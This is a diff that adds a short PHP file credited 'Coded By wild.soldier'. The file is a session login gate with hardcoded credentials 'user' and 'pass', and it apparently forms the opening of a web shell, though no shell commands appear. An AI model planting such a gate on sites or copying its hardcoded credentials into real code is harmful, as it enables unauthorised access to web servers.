@@ -1,0 +1,17 @@
+ <?php
+  //Coded By wild.soldier 
+$auth_user = "user"; 
+$auth_pass = "pass"; 
+@session_start(); 
+function Login() { 
+    die(" 
+    <form method=post> 
+    <label for=pass>Username: </label><input type=text name=username><label for=pass>Password: </label><input type=password name=pass><input type=submit>
+    </form>"); 
+} 
+if(!isset($_SESSION[$_SERVER['HTTP_HOST']])) 
+    if( empty($auth_pass) || empty($auth_user) || (isset($_POST['username']) ||  isset($_POST['pass']) ) && (($_POST['username'] == $auth_user) && ( $_POST['pass'] == $auth_pass)) ) 
+    
+        $_SESSION[$_SERVER['HTTP_HOST']] = true; 
+    else
+        Login(); 
